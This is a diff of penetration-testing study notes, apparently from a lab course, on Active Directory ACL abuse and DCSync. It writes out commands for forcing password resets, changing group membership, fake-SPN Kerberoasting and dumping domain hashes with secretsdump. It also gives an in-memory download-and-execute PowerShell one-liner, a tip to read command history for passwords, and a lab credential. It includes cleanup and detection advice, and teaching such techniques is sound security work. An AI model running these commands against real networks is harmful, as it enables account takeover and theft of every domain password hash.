+	> Some common attack scenarios may include:
+	Attack 					Description
+	- Abusing forgot password permissions 	Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.
+	- Abusing group membership management 	It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.
+	- Excessive user rights 	We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.
+
+	> There are many other possible attack scenarios in the world of Active Directory ACLs, but these three are the most common. We will cover enumerating these rights in various ways, performing the attacks, and cleaning up after ourselves.
+	> Note: Some ACL attacks can be considered "destructive," such as changing a user's password or performing other modifications within a client's AD domain. If in doubt, it's always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly. 
+
+
+[+] ACL Enumeration
+
+	> Let's jump into enumerating ACLs using PowerView and walking through some graphical representations using BloodHound. We will then cover a few scenarios/attacks where the ACEs we enumerate can be leveraged to gain us further access in the internal environment.
+
+* Enumerating ACLs with PowerView
+
+	> We can use PowerView to enumerate ACLs, but the task of digging through all of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function Find-InterestingDomainAcl we will receive a massive amount of information back that we would need to dig through to make any sense of:
+	> Using Find-InterestingDomainAcl
+		PS C:\htb> Find-InterestingDomainAcl
+
+	> If we try to dig through all of this data during a time-boxed assessment, we will likely never get through it all or find anything interesting before the assessment is over. Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over. Let's focus on the user wley, which we obtained after solving the last question in the LLMNR/NBT-NS Poisoning - from Linux section. Let's dig in and see if this user has any interesting ACL rights that we could take advantage of. We first need to get the SID of our target user to search effectively.
+	> Using Find-InterestingDomainAcl
+		PS C:\htb> Import-Module .\PowerView.ps1
+		PS C:\htb> $sid = Convert-NameToSid wley
+
+	> We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.
+	> Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.
+	> Using Get-DomainObjectACL
+		PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+			ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+			ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+			ActiveDirectoryRights  : ExtendedRight
+			ObjectAceFlags         : ObjectAceTypePresent
+			ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
+			InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+			BinaryLength           : 56
+			AceQualifier           : AccessAllowed
+			IsCallback             : False
+			OpaqueLength           : 0
+			AccessMask             : 256
+			SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+			AceType                : AccessAllowedObject
+			AceFlags               : ContainerInherit
+			IsInherited            : False
+			InheritanceFlags       : ContainerInherit
+			PropagationFlags       : None
+			AuditFlags             : None
+
+	> We could Google for the GUID value 00299570-246d-11d0-a768-00aa006e0529 and uncover this(https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.
+	> Performing a Reverse Search & Mapping to a GUID Value
+		PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
+		PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+
+			Name              : User-Force-Change-Password
+			DisplayName       : Reset Password
+			DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+			rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
+
+	> This gave us our answer, but would be highly inefficient during an assessment. PowerView has the ResolveGUIDs flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the ObjectAceType property as User-Force-Change-Password.
+	> Using the -ResolveGUIDs Flag
+		PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+
+			AceQualifier           : AccessAllowed
+			ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+			ActiveDirectoryRights  : ExtendedRight
+			ObjectAceType          : User-Force-Change-Password
+			ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+			InheritanceFlags       : ContainerInherit
+			BinaryLength           : 56
+			AceType                : AccessAllowedObject
+			ObjectAceFlags         : ObjectAceTypePresent
+			IsCallback             : False
+			PropagationFlags       : None
+			SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+			AccessMask             : 256
+			AuditFlags             : None
+			IsInherited            : False
+			AceFlags               : ContainerInherit
+			InheritedObjectAceType : All
+			OpaqueLength           : 0
+
+	> Why did we walk through this example when we could have just searched using ResolveGUIDs first?
+	
+	> It is essential that we understand what our tools are doing and have alternative methods in our toolkit in case a tool fails or is blocked. Before moving on, let's take a quick look at how we could do this using the Get-Acl and Get-ADUser cmdlets which we may find available to us on a client system. Knowing how to perform this type of search without using a tool such as PowerView is greatly beneficial and could set us apart from our peers. We may be able to use this knowledge to achieve results when a client has us work from one of their systems, and we are restricted down to what tools are readily available on the system without the ability to pull in any of our own.
+
+	> This example is not very efficient, and the command can take a long time to run, especially in a large environment. It will take much longer than the equivalent command using PowerView. In this command, we've first made a list of all domain users with the following command:
+	> Creating a List of Domain Users
+		PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+
+	> We then read each line of the file using a foreach loop, and use the Get-Acl cmdlet to retrieve ACL information for each domain user by feeding each line of the ad_users.txt file to the Get-ADUser cmdlet. We then select just the Access property, which will give us information about access rights. Finally, we set the IdentityReference property to the user we are in control of (or looking to see what rights they have), in our case, wley.
+	> A Useful foreach Loop
+		PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+
+			Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
+			                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+			ActiveDirectoryRights : ExtendedRight
+			InheritanceType       : All
+			ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
+			InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+			ObjectFlags           : ObjectAceTypePresent
+			AccessControlType     : Allow
+			IdentityReference     : INLANEFREIGHT\wley
+			IsInherited           : False
+			InheritanceFlags      : ContainerInherit
+			PropagationFlags      : None
+
+	> Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.
+
+	> So, to recap, we started with the user wley and now have control over the user damundsen via the User-Force-Change-Password extended right. Let's use Powerview to hunt for where, if anywhere, control over the damundsen account could take us.
+	> Further Enumeration of Rights Using damundsen
+		PS C:\htb> $sid2 = Convert-NameToSid damundsen
+		PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+
+			AceType               : AccessAllowed
+			ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+			ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
+			OpaqueLength          : 0
+			ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
+			InheritanceFlags      : ContainerInherit
+			BinaryLength          : 36
+			IsInherited           : False
+			IsCallback            : False
+			PropagationFlags      : None
+			SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
+			AccessMask            : 131132
+			AuditFlags            : None
+			AceFlags              : ContainerInherit
+			AceQualifier          : AccessAllowed
+
+	> Now we can see that our user damundsen has GenericWrite privileges over the Help Desk Level 1 group. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it. A search for rights conferred upon this group does not return anything interesting.
+
+	> Let's look and see if this group is nested into any other groups, remembering that nested group membership will mean that any users in group A will inherit all rights of any group that group A is nested into (a member of). A quick search shows us that the Help Desk Level 1 group is nested into the Information Technology group, meaning that we can obtain any rights that the Information Technology group grants to its members if we just add ourselves to the Help Desk Level 1 group where our user damundsen has GenericWrite privileges.
+	> Investigating the Help Desk Level 1 Group with Get-DomainGroup
+		PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+
+			memberof                                                                      
+			--------                                                                      
+			CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+
+	> This is a lot to digest! Let's recap where we're at:
+
+    		- We have control over the user wley whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
+    		- We enumerated objects that the user wley has control over and found that we could force change the password of the user damundsen
+    		- From here, we found that the damundsen user can add a member to the Help Desk Level 1 group using GenericWrite privileges
+    		- The Help Desk Level 1 group is nested into the Information Technology group, which grants members of that group any rights provisioned to the Information Technology group
+
+	> Now let's look around and see if members of Information Technology can do anything interesting. Once again, doing our search using Get-DomainObjectACL shows us that members of the Information Technology group have GenericAll rights over the user adunn, which means we could:
+
+    		- Modify group membership
+    		- Force change a password
+    		- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak
+
+	> Investigating the Information Technology Group
+		PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
+		PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+
+			AceType               : AccessAllowed
+			ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+			ActiveDirectoryRights : GenericAll
+			OpaqueLength          : 0
+			ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
+			InheritanceFlags      : ContainerInherit
+			BinaryLength          : 36
+			IsInherited           : False
+			IsCallback            : False
+			PropagationFlags      : None
+			SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
+			AccessMask            : 983551
+			AuditFlags            : None
+			AceFlags              : ContainerInherit
+			AceQualifier          : AccessAllowed
+
+	> Finally, let's see if the adunn user has any type of interesting access that we may be able to leverage to get closer to our goal.
+	> Looking for Interesting Access
+		PS C:\htb> $adunnsid = Convert-NameToSid adunn 
+		PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+
+			AceQualifier           : AccessAllowed
+			ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+			ActiveDirectoryRights  : ExtendedRight
+			ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
+			ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+			InheritanceFlags       : ContainerInherit
+			BinaryLength           : 56
+			AceType                : AccessAllowedObject
+			ObjectAceFlags         : ObjectAceTypePresent
+			IsCallback             : False
+			PropagationFlags       : None
+			SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+			AccessMask             : 256
+			AuditFlags             : None
+			IsInherited            : False
+			AceFlags               : ContainerInherit
+			InheritedObjectAceType : All
+			OpaqueLength           : 0
+			
+			AceQualifier           : AccessAllowed
+			ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+			ActiveDirectoryRights  : ExtendedRight
+			ObjectAceType          : DS-Replication-Get-Changes
+			ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+			InheritanceFlags       : ContainerInherit
+			BinaryLength           : 56
+			AceType                : AccessAllowedObject
+			ObjectAceFlags         : ObjectAceTypePresent
+			IsCallback             : False
+			PropagationFlags       : None
+			SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+			AccessMask             : 256
+			AuditFlags             : None
+			IsInherited            : False
+			AceFlags               : ContainerInherit
+			InheritedObjectAceType : All
+			OpaqueLength           : 0
+
+	> The output above shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the DCSync section.
+
+* Enumerating ACLs with BloodHound
+
+	> Now that we've enumerated the attack path using more manual methods like PowerView and built-in PowerShell cmdlets, let's look at how much easier this would have been to identify using the extremely powerful BloodHound tool. Let's take the data we gathered earlier with the SharpHound ingestor and upload it to BloodHound. Next, we can set the wley user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under Transitive Object Control. If we click on the 1 next to First Degree Object Control, we see the first set of rights that we enumerated, ForceChangePassword over the damundsen user.
+	> Viewing Node Info through BloodHound
+
+	> If we right-click on the line between the two objects, a menu will pop up. If we select Help, we will be presented with help around abusing this ACE, including:
+
+    		- More info on the specific right, tools, and commands that can be used to pull off this attack
+    		- Operational Security (Opsec) considerations
+    		- External references.
+
+* Investigating ForceChangePassword Further
+
+
+	> If we click on the 16 next to Transitive Object Control, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.
+	> Viewing Potential Attack Paths through BloodHound  => (https://academy.hackthebox.com/storage/modules/143/wley_path.png)
+	> Finally, we can use the pre-built queries in BloodHound to confirm that the adunn user has DCSync rights.
+
+* We've now enumerated these attack paths in multiple ways. The next step will be performing this attack chain from start to finish. Let's dig in!
+
+-=-=-=-=
+
+[+] ACL Abuse tactics
+
+* Abusing ACLs
+
+	> Once again, to recap where we are and where we want to get to. We are in control of the wley user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the adunn user who can perform the DCSync attack, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. To perform the attack chain, we have to do the following:
+		- Use the wley user to change the password for the damundsen user
+    		- Authenticate as the damundsen user and leverage GenericAll rights to add a user that we control to the Help Desk Level 1 group
+    		- Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user
+
+1. So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.
+	> Creating a PSCredential Object
+		PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+		PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
+
+	> Next, we must create a SecureString object which represents the password we want to set for the target user damundsen.
+	> Creating a SecureString Object
+		PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+	> Finally, we'll use the Set-DomainUserPassword PowerView function to change the user's password. We need to use the -Credential flag with the credential object we created for the wley user. It's best to always specify the -Verbose flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as pth-net, which is part of the pth-toolkit => (https://github.com/byt3bl33d3r/pth-toolkit)
+	> Changing the User's Password
+		PS C:\htb> cd C:\Tools\
+		PS C:\htb> Import-Module .\PowerView.ps1
+		PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+	> We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the wley user that we control. Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.
+	> Creating a SecureString Object using damundsen
+		PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+		PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+
+	> Next, we can use the Add-DomainGroupMember function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the pth-toolkit.
+	> Adding damundsen to the Help Desk Level 1 Group
+		PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+	> Adding damundsen to the Help Desk Level 1 Group
+		PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+	> A quick check shows that our addition to the group was successful.
+	> Confirming damundsen was Added to the Group
+		PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+	> At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.
+	> We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast(https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
+	> Creating a Fake SPN
+		PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+	> If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.
+	> Kerberoasting with Rubeus
+		PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+	> Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack, which we will cover in the next section.
+
+* Cleanup
+
+	> In terms of cleanup, there are a few things we need to do:
+
+    		- Remove the fake SPN we created on the adunn user.
+    		- Remove the damundsen user from the Help Desk Level 1 group
+    		- Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user
+
+	> This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.
+	> First, let's remove the fake SPN from the adunn account.
+	> Removing the Fake SPN from adunn's Account
+		PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+	> Next, we'll remove the user from the group using the Remove-DomainGroupMember function.
+	> Removing damundsen from the Help Desk Level 1 Group
+		PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+
+	> We can confirm the user was indeed removed:
+	> Confirming damundsen was Removed from the Group
+		PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+
+	> Even though we performed as much cleanup as possible, we should still include every modification that we make in our final assessment report. Our client will want to be apprised of any changes within the environment, and recording everything we do during an assessment in writing helps our client and us should questions arise.
+	> This is just one example attack path. There could be many attack paths in a large domain, some shorter and some more complicated. While this path was fictional for this specific lab environment, I have seen similar attack paths during real-world engagements, and ACL attacks often come into play for furthering access. Sometimes, though, an ACL attack chain may be too time-consuming or potentially destructive, so we may prefer to enumerate the path to present our client with enough evidence to understand the issue and perform remediation.
+
+* Detection and Remediation
+! A few recommendations around ACLs include:
+	> Auditing for and removing dangerous ACLs
+		- Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.
+	> Monitor group membership
+		- Visibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain.
+	> Audit and monitor for ACL changes
+		- Enabling the Advanced Security Audit Policy can help in detecting unwanted changes, especially Event ID 5136: A directory service object was modified which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID 5136 created:
+	> Viewing Event ID 5136
+	> If we check out the Details tab, we can see that the pertinent information is written in Security Descriptor Definition Language (SDDL) which is not human readable.
+	> Viewing Associated SDDL (Details => Friendly View => AttributeValue)
+
+	> We can use the ConvertFrom-SddlString cmdlet to convert this to a readable format.
+	> Converting the SDDL String into a Readable Format
+		PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC...."
+
+	> If we choose to filter on the DiscretionaryAcl property, we can see that the modification was likely giving the mrb3n user GenericWrite privileges over the domain object itself, which could be indicative of an attack attempt.
+	> Converting the SDDL String into a Readable Format
+
+			PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:A... [SNIP]" | select -ExpandProperty DiscretionaryAcl
+
+	> There are many tools out there that can be used to help monitor AD. These tools, when used in conjunction with a highly mature AD secure posture, and combined with built-in tools such as the various ways we can monitor for and alert on events in Active Directory, can help to detect these types of attacks and prevent them from going any further.
+	> In the next section, we'll walk through the DCSync attack, which is the result of the attack path we just worked through and is a common way to achieve domain compromise.
+
+
+[+] DCSync
+
+	> Based on our work in the previous section, we now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.
+
+* Scenario Setup
+
+	> In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host (secretsdump.py) you can open a PowerShell console on MS01 and SSH to 172.16.5.225 with the credentials htb-student:HTB_@cademy_stdnt!. This could also likely be done all from Windows using a version of secretsdump.exe compiled for Windows as there are several GitHub repos of the Impacket toolkit compiled for Windows, or you can do that as a side challenge.
+	> What is DCSync and How Does it Work?
+
+		- DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+		- The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.
+		- To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
+	> Viewing adunn's Replication Privileges through ADSI Edit
+		(https://academy.hackthebox.com/storage/modules/143/adnunn_right_dcsync.png)
+		ADSI Edit => Security => Permissions for Angela Dunn
+
+	> It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords. Here we have a standard domain user that has been granted the replicating permissions:
+	> Using Get-DomainUser to View adunn's Group Membership
+		PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+	> PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. We first get the user's SID in the above command and then check all ACLs set on the domain object ("DC=inlanefreight,DC=local") using Get-ObjectAcl to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user adunn (denoted in the below command as $sid) possesses these rights. The command confirms that the user does indeed have the rights.
+	> Using Get-ObjectAcl to Check adunn's Replication Rights
+		PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+		PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+
+	> If we had certain rights over the user (such as WriteDacl), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.
+
+	> Running the tool as below will write all hashes to files with the prefix inlanefreight_hashes. The -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+	> Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
+		m1l0js@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+
+
+	> We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user <USERNAME> to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:
+
+    		- Number and % of passwords cracked
+    		- top 10 passwords
+    		- Password length metrics
+    		- Password re-use
+
+	> Reflect only active user accounts in the domain.
+
+	> If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.
+	> Listing Hashes, Kerberos Keys, and Cleartext Passwords
+		m1l0js@htb[/htb]$ ls inlanefreight_hashes*
+
+		inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
+
+	> While rare, we see accounts with these settings from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.
+	> Viewing an Account with Reversible Encryption Password Storage Set
+		(https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)
+		Account ==> Account options ==> Store password using reversible encryption
 
 image
 
-The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command systeminfo.
-Systeminfo
-
-image
-
-The systeminfo command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.
-Harnessing PowerShell
-
-PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.
-
-Let's look at a few of the ways PowerShell can help us.
-Cmd-Let 	Description
-Get-Module 	Lists available modules loaded for use.
-Get-ExecutionPolicy -List 	Will print the execution policy settings for each scope on a host.
-Set-ExecutionPolicy Bypass -Scope Process 	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
-Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
-Get-ChildItem Env: | ft Key,Value 	Return environment values such as key paths, users, computer information, etc.
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" 	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
-
-Let's see them in action now on the MS01 host.
-Quick Checks Using PowerShell
-Quick Checks Using PowerShell
-
-PS C:\htb> Get-Module
-
-ModuleType Version    Name                                ExportedCommands
----------- -------    ----                                ----------------
-Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
-Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
-Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
-
-PS C:\htb> Get-ExecutionPolicy -List
-Get-ExecutionPolicy -List
-
-        Scope ExecutionPolicy
-        ----- ---------------
-MachinePolicy       Undefined
-   UserPolicy       Undefined
-      Process       Undefined
-  CurrentUser       Undefined
- LocalMachine    RemoteSigned
-
-
-PS C:\htb> whoami
-nt authority\system
-
-PS C:\htb> Get-ChildItem Env: | ft key,value
-
-Get-ChildItem Env: | ft key,value
-
-Key                     Value
----                     -----
-ALLUSERSPROFILE         C:\ProgramData
-APPDATA                 C:\Windows\system32\config\systemprofile\AppData\Roaming
-CommonProgramFiles      C:\Program Files (x86)\Common Files
-CommonProgramFiles(x86) C:\Program Files (x86)\Common Files
-CommonProgramW6432      C:\Program Files\Common Files
-COMPUTERNAME            ACADEMY-EA-MS01
-ComSpec                 C:\Windows\system32\cmd.exe
-DriverData              C:\Windows\System32\Drivers\DriverData
-LOCALAPPDATA            C:\Windows\system32\config\systemprofile\AppData\Local
-NUMBER_OF_PROCESSORS    4
-OS                      Windows_NT
-Path                    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShel...
-PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
-PROCESSOR_ARCHITECTURE  x86
-PROCESSOR_ARCHITEW6432  AMD64
